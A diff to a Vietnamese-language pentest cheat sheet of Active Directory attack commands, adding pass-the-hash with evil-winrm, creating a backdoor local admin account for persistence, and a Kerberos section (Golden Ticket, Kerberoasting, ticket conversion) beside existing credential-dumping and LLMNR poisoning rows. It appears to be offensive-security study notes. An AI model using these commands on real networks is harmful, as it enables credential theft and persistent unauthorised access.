@@ -18,9 +18,19 @@ Tổng hợp các câu lệnh khai thác Active Directory phổ biến.
 | `responder` | `sudo responder -I eth0 -dw` | Giai đoạn Poisoning LLMNR/NBT-NS |
 | `impacket` | `psexec.py domain/user:pass@IP` | Lấy shell qua SMB/Psexec |
 
-## 👑 Leo thang đặc quyền (PrivEsc)
+## 👑 Leo thang đặc quyền & Duy trì (PrivEsc & Persistence)
 | Tool | Command | Mục đích |
 | :--- | :--- | :--- |
 | `mimikatz` | `sekurlsa::logonpasswords` | Dump mật khẩu từ bộ nhớ (RAM) |
 | `bloodhound` | `sharpbound.exe -c All` | Thu thập dữ liệu quan hệ AD |
-| `secretsdump` | `secretsdump.py -ntds ntds.dit -system system LOCAL` | Dump NTDS.dit offline |
+| `evil-winrm` | `evil-winrm -i <IP> -u <User> -H <Hash>` | **Pass-the-Hash** (Xác thực bằng Hash) |
+| `net user` | `net user <User> <Pass> /add` | Tạo user local mới (Persistence) |
+| `net localgroup`| `net localgroup administrators <User> /add` | Gán quyền Admin cho user local |
+
+## 🎟️ Kerberos Attacks
+| Kỹ thuật | Command / Tool | Mô tả |
+| :--- | :--- | :--- |
+| **Golden Ticket** | `mimikatz "kerberos::golden ..."` | Đúc vé TGT giả mạo với Hash `krbtgt` |
+| **Ticket Convert**| `impacket-ticketConverter v.kirbi v.ccache`| Chuyển đổi vé Windows sang Linux format |
+| **Kerberoasting** | `GetUserSPNs.py -request` | Trộm TGS hash của các Service Account |
+
